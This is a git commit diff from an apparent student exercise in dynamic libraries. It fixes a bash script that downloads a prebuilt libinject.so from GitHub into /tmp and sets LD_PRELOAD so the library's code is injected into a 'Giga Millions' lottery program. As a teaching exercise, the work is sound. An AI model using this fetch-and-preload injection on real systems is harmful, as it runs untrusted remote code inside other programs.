d539f7295d35f752c786b5dbd1477c6feb3c9a9f
MiguelBarreraDev <barreram987@gmail.com>
2022-01-10 17:41:31 -0500

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -O /tmp/libinject.so https://github.com/MiguelBarreraDev/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/libinject.so
+wget -O /tmp/libinject.so https://raw.github.com/MiguelBarreraDev/holbertonschool-low_level_programming/main/0x18-dynamic_libraries/libinject.so
 export LD_PRELOAD=/tmp/libinject.so
